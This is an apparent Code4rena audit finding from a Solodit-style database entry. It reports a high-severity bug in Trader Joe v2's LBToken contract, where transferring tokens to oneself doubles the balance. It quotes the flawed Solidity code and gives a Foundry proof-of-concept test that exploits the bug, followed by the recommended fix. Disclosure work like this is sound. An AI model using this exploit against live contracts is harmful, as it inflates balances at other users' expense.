---
# Core Classification
protocol: Trader Joe
chain: everychain
category: uncategorized
vulnerability_type: from=to

# Attack Vector Details
attack_type: from=to
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 5706
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2022-10-trader-joe-v2-contest
source_link: https://code4rena.com/reports/2022-10-traderjoe
github_link: https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 1.00
financial_impact: high

# Scoring
quality_score: 5
rarity_score: 5

# Context Tags
tags:
  - from=to

protocol_categories:
  - dexes
  - cdp
  - yield
  - services
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 18
finders:
  - 8olidity
  - __141345__
  - bitbopper
  - JMukesh
  - ne0n
---

## Vulnerability Title

[H-01] Transfering funds to yourself increases your balance

### Overview


This bug report is about a vulnerability that exists in the code of the LBToken.sol file. The vulnerability is caused by using temporary variables to update balances which can lead to several hacks in the past. Specifically, it can be seen that `_toBalance` can overwrite `_fromBalance`, which can be exploited by transferring all funds to oneself and doubling the balance. To fix this, checks should be added to make sure that `_from != _to` and the code should be changed to use `_balances[_id][_from] -= _amount;` and `_balances[_id][_to] += _amount;` instead.

### Original Finding Content


<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182><br>
<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187><br>
<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192><br>

Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:

```solidity
File: LBToken.sol
176:     function _transfer(
177:         address _from,
178:         address _to,
179:         uint256 _id,
180:         uint256 _amount
181:     ) internal virtual {
182:         uint256 _fromBalance = _balances[_id][_from];
...
187:         uint256 _toBalance = _balances[_id][_to];
188: 
189:         unchecked {
190:             _balances[_id][_from] = _fromBalance - _amount;
191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt
192:         }
..
196:     }
```

Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :

```solidity
File: LBToken.sol
32:     modifier checkApproval(address _from, address _spender) {
33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);
34:         _;
35:     }
...
131:     function safeTransferFrom(
...
136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {
...
269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {
270:         return _owner == _spender || _spenderApprovals[_owner][_spender];
271:     }
```

### Proof of Concept

Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):

```solidity
    function testSafeTransferFromOneself() public {
        uint256 amountIn = 1e18;

        (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);

        uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);

        assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding

        pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself
        uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance
        assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one
        assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding
    }
```

As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.

### Recommended Mitigation Steps

*   Add checks to make sure that `_from != _to` because that shouldn't be useful anyway
*   Prefer the following:

```solidity
File: LBToken.sol
189:         unchecked {
190:             _balances[_id][_from] -= _amount;
191:             _balances[_id][_to] += _amount;
192:         }
```

**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299#issuecomment-1307892670):**
 > The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.
> 
> Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.
> 
> Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 5/5 |
| Rarity Score | 5/5 |
| Audit Firm | Code4rena |
| Protocol | Trader Joe |
| Report Date | N/A |
| Finders | 8olidity, __141345__, bitbopper, JMukesh, ne0n, phaze, cccz, SEVEN, Dravee, hxzy, RaoulSchaffranek, Ryyy, Lambda, saian, hansfriese, parashar, Tutturu, neumo |

### Source Links

- **Source**: https://code4rena.com/reports/2022-10-traderjoe
- **GitHub**: https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299
- **Contest**: https://code4rena.com/contests/2022-10-trader-joe-v2-contest

### Keywords for Search

`from=to`

